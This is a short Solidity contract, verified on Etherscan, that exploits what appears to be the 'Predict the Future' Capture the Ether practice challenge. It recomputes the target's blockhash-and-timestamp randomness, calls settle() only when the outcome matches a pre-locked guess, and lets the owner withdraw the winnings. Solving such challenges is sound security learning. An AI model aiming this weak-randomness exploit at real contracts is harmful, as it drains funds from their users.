/**
 *Submitted for verification at Etherscan.io on 2021-11-23
*/

pragma solidity ^0.4.21;

interface PredictTheFutureChallenge {
    function settle() external;
}

contract checkHash {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function() payable { }
    
    PredictTheFutureChallenge ptfc = PredictTheFutureChallenge(0xe041B031cb9DCCFeF656dD430A9757F311275602);
    
    function compute() public payable {
        require(uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 6); //I chose 6
        ptfc.settle();
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}